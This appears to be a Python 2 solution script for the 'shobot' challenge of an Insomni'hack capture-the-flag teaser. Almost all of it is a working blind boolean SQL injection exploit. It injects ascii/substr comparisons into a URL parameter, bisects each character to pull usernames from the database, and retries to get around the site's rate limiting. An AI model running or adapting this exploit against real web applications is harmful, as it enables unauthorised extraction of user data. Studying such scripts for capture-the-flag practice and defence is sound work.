# MIT License
#
# Copyright (c) 2017 Pietro Ferretti
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import requests
import time

# "http://shobot.teaser.insomnihack.ch/?page=article&artid=2' and ascii(substr((select table_name from information_schema.tables order by table_name limit 1 offset 1),3,3))=65; -- &addToCart"

cookies = dict(PHPSESSID="vq6v4jdosbm9e0js0oik5m4lb0")

# Girlybot = True


def find_char(n_username, n_char):
    #base_url = "http://shobot.teaser.insomnihack.ch/?page=article&artid=2' and ascii(substr((select table_name from information_schema.tables order by table_name limit 1 offset " + str(n_table) + ")," + str(n_char) + "," + str(n_char) + "))"
    base_url = "http://shobot.teaser.insomnihack.ch/?page=article&artid=2' and ascii(substr((select shbt_username from shbt_user order by shbt_username limit 1 offset " + str(n_username) + ")," + str(n_char) + "," + str(n_char) + "))"
    end_url = "; -- &addToCart"

    # check if we exceeded the name length
    wait = 4
    time.sleep(wait)
    end_test_url = base_url + ">0" + end_url
    print end_test_url
    res = requests.get(end_test_url, cookies=cookies)
    while "trusted" in res.text:
        print "retrying..."
        wait += 4
        time.sleep(wait)
        res = requests.get(end_test_url, cookies=cookies)

    if "Girlybot" not in res.text:
        return None    # no characters to find

    # start bisecting to find the character
    low = 0
    high = 255
    char = False
    while low != (high-1):

        wait = 4
        time.sleep(wait)
        test_url = base_url + ">" + str((low+high)/2) + end_url
        print test_url
        res = requests.get(test_url, cookies=cookies)
        while "trusted" in res.text:
            print "retrying..."
            wait += 4
            time.sleep(wait)
            res = requests.get(test_url, cookies=cookies)

        if "Girlybot" in res.text:
            low = (low+high)/2
        else:
            high = (low+high)/2
    char = chr(high)
    return char


usernames = []

for n_username in [0]:

    print n_username

    username_value = ""
    n_char = 1
    end = False

    while not end:
        new_char = find_char(n_username, n_char)

        if new_char == None:
            end = True
            continue
        else:
            username_value += new_char
            print username_value
            n_char += 1

    usernames.append(username_value)

print usernames